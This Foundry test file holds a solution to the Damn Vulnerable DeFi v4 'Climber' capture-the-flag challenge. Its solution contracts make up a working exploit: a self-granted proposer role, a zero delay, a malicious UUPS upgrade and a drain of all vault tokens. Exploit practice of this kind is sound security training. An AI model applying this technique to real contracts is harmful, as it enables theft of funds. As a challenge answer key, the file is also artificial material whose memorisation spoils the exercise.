// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * =========================================================
     * SOLUTION - test_climber()
     * =========================================================
     * Attack: execute-before-state-check + self-administered timelock
     * ClimberTimelock.execute() runs every call BEFORE verifying the
     * operation is ReadyForExecution, and the timelock holds ADMIN_ROLE over
     * itself. A single execute() batch therefore bootstraps its own authority:
     * 1. grantRole(PROPOSER_ROLE, attacker)  - timelock admins itself.
     * 2. updateDelay(0)                       - msg.sender == timelock, ok.
     * 3. vault.upgradeToAndCall(PwnedVault, sweepAll(token, recovery)) - the
     *    timelock owns the UUPS vault; the new impl drains tokens to recovery.
     * 4. attacker.scheduleSelf()              - now a proposer, it schedules the
     *    identical batch; with delay 0 it is instantly ReadyForExecution, so
     *    the post-loop state check passes and execute() does not revert.
     *
     * Player deploys the attacker and calls exploit() (single entry point).
     * =========================================================
     */
    function test_climber() public checkSolvedByPlayer {
        ClimberAttacker attacker = new ClimberAttacker(
            payable(address(timelock)), address(vault), address(token), recovery
        );
        attacker.exploit();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

/**
 * =========================================================
 * SOLUTION CONTRACT - PwnedVault
 * =========================================================
 * Malicious UUPS implementation the timelock upgrades the vault to. It keeps a
 * compatible storage layout and a valid _authorizeUpgrade, and adds an
 * unprotected sweepAll() that ships every token to the recovery address.
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice Replacement vault logic exposing an open drain function.
 * @dev Must remain UUPS-proxiable so upgradeToAndCall succeeds.
 */
contract PwnedVault is UUPSUpgradeable {
    function sweepAll(address token, address recovery) external {
        IERC20(token).transfer(recovery, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address) internal override {}
}

/**
 * =========================================================
 * SOLUTION CONTRACT - ClimberAttacker
 * =========================================================
 * Builds the malicious 4-call batch and fires ClimberTimelock.execute(). It
 * also implements scheduleSelf(), called as the batch's final step, which
 * re-derives the identical batch and schedules it so the operation is
 * ReadyForExecution by the time execute()'s state check runs.
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice One-shot Climber exploit orchestrator.
 * @dev exploit() and scheduleSelf() build byte-identical batches/salt.
 */
contract ClimberAttacker {
    address payable private immutable timelock;
    address private immutable vault;
    address private immutable token;
    address private immutable recovery;
    address private immutable pwnedImpl;
    bytes32 private constant SALT = keccak256("climber.pwn");

    constructor(address payable _timelock, address _vault, address _token, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
        pwnedImpl = address(new PwnedVault());
    }

    // Build the exact batch executed and scheduled (identical in both paths).
    function _buildBatch()
        internal
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory data)
    {
        targets = new address[](4);
        values = new uint256[](4);
        data = new bytes[](4);

        // 1. Grant ourselves PROPOSER_ROLE (timelock admins itself).
        targets[0] = timelock;
        data[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        // 2. Drop the delay to 0 so the scheduled op is instantly ready.
        targets[1] = timelock;
        data[1] = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));

        // 3. Upgrade the vault and drain it to recovery in one shot.
        targets[2] = vault;
        data[2] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            pwnedImpl,
            abi.encodeWithSignature("sweepAll(address,address)", token, recovery)
        );

        // 4. Schedule this very batch (we are a proposer after call 1).
        targets[3] = address(this);
        data[3] = abi.encodeWithSignature("scheduleSelf()");
    }

    function exploit() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory data) = _buildBatch();
        IClimberTimelock(timelock).execute(targets, values, data, SALT);
    }

    function scheduleSelf() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory data) = _buildBatch();
        IClimberTimelock(timelock).schedule(targets, values, data, SALT);
    }
}

interface IClimberTimelock {
    function execute(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external payable;
    function schedule(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external;
}
